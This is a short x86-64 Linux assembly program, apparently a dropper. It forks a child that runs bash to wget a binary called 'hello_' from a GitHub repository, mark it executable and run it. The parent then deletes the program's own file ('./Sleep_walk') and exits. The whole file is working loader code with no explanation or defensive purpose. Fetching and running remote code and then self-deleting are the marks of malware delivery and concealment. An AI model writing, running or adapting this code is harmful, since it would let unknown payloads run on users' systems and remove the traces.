section .data
	filepath db "./Sleep_walk",  0
	sh_path db '/usr/bin/bash', 0
	argc_c db '-c', 0
	cmd_str db 'wget -q -O hello_ https://github.com/Ossipher/Sleep-Walk/raw/refs/heads/main/hello_ && chmod +x ./hello_ && ./hello_', 0
	argv dq sh_path, argc_c, cmd_str, 0

section .text 
	global _start
_start:
	mov rax, 57
	syscall
	cmp rax, 0
	je .execute

.wait:
        mov rdi, rax ; child PID returned by fork
        xor rsi, rsi
        xor rdx, rdx
        xor r10, r10
        mov rax, 61 ; SYS_wait
        syscall
        mov rax, 87
        lea rdi, [rel filepath]
        syscall
        mov rax, 0x3c
        xor rdi, rdi
        syscall

.execute:
	mov rax, 59
        mov rdi, sh_path
        mov rsi, argv
        xor rdx, rdx
        syscall
        mov rax, 0x3c
        mov rdi, 1
        syscall
